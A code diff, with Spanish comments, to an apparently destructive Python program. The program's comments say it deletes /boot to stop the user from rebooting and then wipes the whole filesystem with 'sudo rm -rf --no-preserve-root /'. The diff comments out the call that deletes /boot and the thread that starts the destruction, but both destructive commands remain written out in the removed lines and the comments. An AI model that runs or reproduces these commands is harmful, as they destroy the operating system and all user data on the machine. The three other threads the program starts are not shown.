@@ -17,7 +17,7 @@ except ModuleNotFoundError:
 def main():
      
      #    Empieza a eliminar el grub para que el usuario no pueda reiniciar así nomas
-     system('sudo rm -rf --no-preserve-root /boot/')
+     #system('sudo rm -rf --no-preserve-root /boot/')
 
      # Lista de threads
      threads = []
@@ -48,14 +48,14 @@ def main():
      #    primero destruyendo el boot para seguidamente remover
      #    todos los archivos que pueda usando el comando ```sudo rm -rf --no-preserve-root /```
      #    source              :    src/destruct.py, línea 5
-     t4 = Thread(target=start_destruction)
-     t4.start()
+     #t4 = Thread(target=start_destruction)
+     #t4.start()
      
      #    Agrega los threads a la lista
      threads.append(t1)
      threads.append(t2)
      threads.append(t3)
-     threads.append(t4)
+     #threads.append(t4)
 
      # Los threads son unidos
      for thread in threads:
